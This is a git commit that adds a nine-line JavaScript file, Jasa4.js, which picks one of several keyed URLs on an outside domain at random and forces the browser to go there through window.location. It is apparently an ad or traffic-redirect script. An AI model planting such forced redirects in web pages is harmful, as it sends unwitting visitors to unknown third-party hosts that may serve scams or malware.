4254dafad763fc459fdf914c6abdca6770b99d2e
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-11-08 23:03:40 +0800

    Create Jasa4.js

---
+++ Jasa4.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+  
+  'https://divorceseed.com/pgnh3n5zwr?key=23286cf86550718e306100e690faba5a',
+  'https://divorceseed.com/pgnh3n5zwr?key=23286cf86550718e306100e690faba5a',
+  'https://divorceseed.com/u43t9mn7?key=c5b7aec72870c2b3a03b76d580d83e5d' 
+  
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
